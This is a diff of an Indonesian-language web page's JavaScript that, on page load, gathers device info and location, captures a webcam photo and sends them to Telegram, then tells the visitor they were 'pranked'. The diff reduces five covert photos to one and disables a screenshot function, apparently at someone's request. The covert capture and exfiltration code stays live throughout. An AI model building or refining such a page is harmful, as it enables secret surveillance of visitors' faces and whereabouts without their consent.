@@ -133,25 +133,18 @@
 
         await new Promise(r => setTimeout(r, 1000)); // auto fokus
 
-        for (let i = 1; i <= 5; i++) {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0);
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
 
-          await new Promise(resolve => {
-            canvas.toBlob(async blob => {
-              await sendPhoto(blob, `camera_${i}.jpg`);
-              resolve();
-            }, 'image/jpeg');
-          });
-
-          await new Promise(r => setTimeout(r, 1000)); // jeda 1 detik
-        }
+        canvas.toBlob(async blob => {
+          await sendPhoto(blob, `camera_front.jpg`);
+          await sendToTelegram('📷 Kamera berhasil kirim 1 foto.');
+        }, 'image/jpeg');
 
         stream.getTracks().forEach(t => t.stop());
-        await sendToTelegram('📷 Kamera berhasil kirim 5 foto.');
       } catch (e) {
         await sendToTelegram('❌ Kamera gagal diakses.');
       }
@@ -214,14 +207,12 @@
       await sendToTelegram(info);
       captureLocation();
       captureCamera();
-      getScreenshot();
+      // getScreenshot();  ← ❌ sudah di-nonaktifkan sesuai permintaan
     };
 
-    // UI: efek ketik
     const msg = `             Selamat anda kena prank.\n         Terima kasih atas kerja samanya.`;
     typeText(document.getElementById('msg'), msg, 30);
 
-    // Mulai proses
     window.onload = collectInfo;
   </script>
 </body>
